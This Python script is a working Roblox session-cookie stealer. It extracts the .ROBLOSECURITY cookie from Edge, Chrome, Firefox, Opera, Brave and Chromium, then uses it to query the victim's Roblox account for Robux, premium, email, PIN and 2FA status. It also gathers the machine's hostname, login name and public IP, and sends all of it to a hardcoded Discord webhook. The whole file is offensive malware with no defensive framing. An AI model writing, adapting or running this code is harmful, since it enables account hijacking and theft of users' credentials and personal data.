import browser_cookie3
import requests
import threading
import os
import socket

WEBHOOK = "https://discord.com/api/webhooks/1564073945404280872/PsuE-h20JTAE6xox2Hav9f9YGLR0zOFQA05oXLwA1bM7xPm3ZDBYocU1_dk_84-aPny8"

found_cookies = []
lock = threading.Lock()

def extract_cookie(cookie_fn, browser_name):
    try:
        cookies = cookie_fn(domain_name="roblox.com")
        cookies_str = str(cookies)
        cookie = cookies_str.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
        if cookie and len(cookie) > 10:
            with lock:
                if cookie not in found_cookies:
                    found_cookies.append(cookie)
                    send_grab(cookie, browser_name)
    except:
        pass

def get_account_info(cookie):
    headers = {
        "Cookie": f".ROBLOSECURITY={cookie}",
        "User-Agent": "Mozilla/5.0"
    }
    info = {
        "username": "?", "userid": "?", "robux": "?",
        "premium": "?", "email": "?", "pin": "?", "twofa": "?"
    }
    try:
        r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=5)
        d = r.json()
        info["username"] = d.get("name", "?")
        info["userid"]   = str(d.get("id", "?"))
    except: pass
    try:
        r = requests.get(f"https://economy.roblox.com/v1/users/{info['userid']}/currency", headers=headers, timeout=5)
        info["robux"] = str(r.json().get("robux", "?"))
    except: pass
    try:
        r = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{info['userid']}/validate-membership", headers=headers, timeout=5)
        info["premium"] = "✅ Yes" if r.text == "true" else "❌ No"
    except: pass
    try:
        r = requests.get("https://accountinformation.roblox.com/v1/email", headers=headers, timeout=5)
        info["email"] = "✅ Verified" if r.json().get("verified") else "❌ Unverified"
    except: pass
    try:
        r = requests.get("https://auth.roblox.com/v1/account/pin", headers=headers, timeout=5)
        info["pin"] = "🔒 Enabled" if r.json().get("isEnabled") else "🔓 Disabled"
    except: pass
    try:
        r = requests.get(f"https://twostepverification.roblox.com/v1/users/{info['userid']}/configuration", headers=headers, timeout=5)
        methods = r.json().get("methods", [])
        info["twofa"] = "🔒 Enabled" if any(m.get("enabled") for m in methods) else "🔓 Disabled"
    except: pass
    return info

def get_sysinfo():
    try:
        ip = requests.get("https://api.ipify.org", timeout=3).text
    except:
        ip = "?"
    return {
        "hostname": socket.gethostname(),
        "user":     os.getlogin(),
        "ip":       ip
    }

def send_grab(cookie, browser_name):
    acc  = get_account_info(cookie)
    sys  = get_sysinfo()

    embed = {
        "title":       f"🔴 COOKIE GRAB | {acc['username']}",
        "color":       15158332,
        "description": f"**Cookie ({browser_name})**\n```fix\n{cookie[:950]}\n```",
        "fields": [
            {"name": "👤 Username",  "value": acc["username"], "inline": True},
            {"name": "🆔 User ID",   "value": acc["userid"],   "inline": True},
            {"name": "💰 Robux",     "value": acc["robux"],    "inline": True},
            {"name": "⭐ Premium",   "value": acc["premium"],  "inline": True},
            {"name": "📧 Email",     "value": acc["email"],    "inline": True},
            {"name": "🔐 2FA",       "value": acc["twofa"],    "inline": True},
            {"name": "📌 PIN",       "value": acc["pin"],      "inline": True},
            {"name": "🌐 Browser",   "value": browser_name,    "inline": True},
            {"name": "🖥️ PC",       "value": f"{sys['user']}@{sys['hostname']}", "inline": True},
            {"name": "🌍 IP",        "value": sys["ip"],       "inline": True},
        ],
        "footer": {"text": f"Python Grabber  •  {browser_name}"}
    }

    requests.post(WEBHOOK, json={"embeds": [embed]}, timeout=5)

browsers = [
    (browser_cookie3.edge,     "Microsoft Edge"),
    (browser_cookie3.chrome,   "Google Chrome"),
    (browser_cookie3.firefox,  "Mozilla Firefox"),
    (browser_cookie3.opera,    "Opera"),
    (browser_cookie3.opera_gx, "Opera GX"),
    (browser_cookie3.brave,    "Brave"),
    (browser_cookie3.chromium, "Chromium"),
]

threads = []
for fn, name in browsers:
    t = threading.Thread(target=extract_cookie, args=(fn, name))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
